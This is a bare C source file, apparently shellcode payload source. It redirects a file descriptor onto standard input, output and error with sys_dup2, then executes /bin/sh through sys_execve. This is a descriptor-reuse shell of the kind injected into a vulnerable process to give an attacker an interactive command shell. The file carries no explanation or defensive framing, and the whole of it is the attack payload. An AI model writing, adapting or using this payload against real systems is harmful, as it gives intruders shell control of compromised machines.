#define FD 1

void main() {
    const char *a[] = {"/bin/sh", 0};
    sys_dup2(FD, 0);
    sys_dup2(FD, 1);
    sys_dup2(FD, 2);
    sys_execve(*a, a, 0);
}
